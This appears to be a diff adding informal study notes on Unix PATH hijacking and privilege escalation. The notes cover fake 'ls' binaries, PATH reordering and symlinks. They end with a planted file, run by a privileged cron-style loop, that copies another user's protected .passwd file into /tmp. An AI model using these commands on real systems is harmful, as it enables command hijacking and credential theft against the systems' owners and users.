@@ -1,0 +1,35 @@
+#when running "ls", instead, run /bin/sh
+echo '#!/bin/sh' > /tmp/ls;
+
+#then change the PATH, so that running ls will look at a different path first
+#good idea to back up your existing $PATH just in case you break something
+#echo $PATH >> ~/path.txt
+
+#directories are separated by ':'. Add $PATH at the end so you don't break shit
+export PATH=/tmp:/usr:$PATH
+
+
+
+
+
+#another way to modify commands, this time using links
+mkdir /tmp/test1
+cd /tmp/test1
+ln -s /bin/cat ls	#now when ls is run, /bin/cat is called
+export PATH=".:$PATH"	#this enables to always look in your current folder first
+~/file	#let's you run "file" located in your home directory, while running it from /tmp/test1
+
+
+
+
+
+#another way to force something to run, when it shouldn't...
+test:
+cd ./
+vi exploit.txt
+cat "/path/to/user/.passwd" >> "/tmp/user_pass.txt"
+
+run the for task command:
+for task in ./*; do [ -e "${task}" ] || continue; timeout -k6s 5s bash -p "${task}"; done
+
+this is assuming that the task is running as a privileged user. The current user does not have access to read .passwd from the above folder. Thus, forcing the privileged user to run your command for you, say, through a cron job, will get you your file.
